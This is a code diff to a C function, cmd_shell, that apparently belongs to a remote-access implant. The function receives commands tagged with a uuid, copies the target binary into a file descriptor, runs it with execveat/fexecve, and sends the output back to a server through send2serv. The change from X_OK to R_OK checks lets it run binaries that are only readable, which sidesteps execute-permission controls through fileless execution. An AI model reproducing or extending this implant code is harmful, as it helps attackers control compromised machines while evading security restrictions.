@@ -13,7 +13,7 @@
 #include "functions/connection/connection.h"
 #include "functions/split/split.h"
 
-void cmd_shell(struct io_uring *ring, int sockfd, const char *uuid, char *input) {
+void cmd_shell(request_t *req, int sockfd, const char *uuid, char *input) {
 
     srand(time(NULL));
     const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
@@ -37,7 +37,7 @@ void cmd_shell(struct io_uring *ring, int sockfd, const char *uuid, char *input)
     bool found_path = false;
 
     if (strchr(command, '/') != NULL) {
-        if (access(command, X_OK) == 0) {
+        if (access(command, R_OK) == 0) {
             snprintf(full_path, sizeof(full_path), "%s", command);
             found_path = true;
         }
@@ -48,7 +48,7 @@ void cmd_shell(struct io_uring *ring, int sockfd, const char *uuid, char *input)
             char *dir = strtok(path_copy, ":");
             while (dir != NULL) {
                 snprintf(full_path, sizeof(full_path), "%s/%s", dir, command);
-                if (access(full_path, X_OK) == 0) {
+                if (access(full_path, R_OK) == 0) {
                     found_path = true;
                     break;
                 }
@@ -61,7 +61,7 @@ void cmd_shell(struct io_uring *ring, int sockfd, const char *uuid, char *input)
 
     if (!found_path) {
         char *message = "ERROR: Command binary not found or error executing command";
-        send2serv(uuid, message, strlen(message));
+        send2serv(req, uuid, message, strlen(message));
         free(args); // Clean up memory from split
         return;     // Stop execution
     }
@@ -104,7 +104,7 @@ void cmd_shell(struct io_uring *ring, int sockfd, const char *uuid, char *input)
         ssize_t bytesWritten = write(af, buffer, st.st_size);
         if (bytesWritten == -1) return;
 
-        fexecve(af, args, envp);
+        execveat(af, "", args, envp, AT_EMPTY_PATH);
         
         return;
     } else {
@@ -127,7 +127,7 @@ void cmd_shell(struct io_uring *ring, int sockfd, const char *uuid, char *input)
             memcpy(output_buffer + total_size, read_chunk, bytes_read);
             total_size += bytes_read;
         }
-        send2serv(uuid, output_buffer, total_size);
+        send2serv(req, uuid, output_buffer, total_size);
         free(output_buffer);
     }
     free(args);
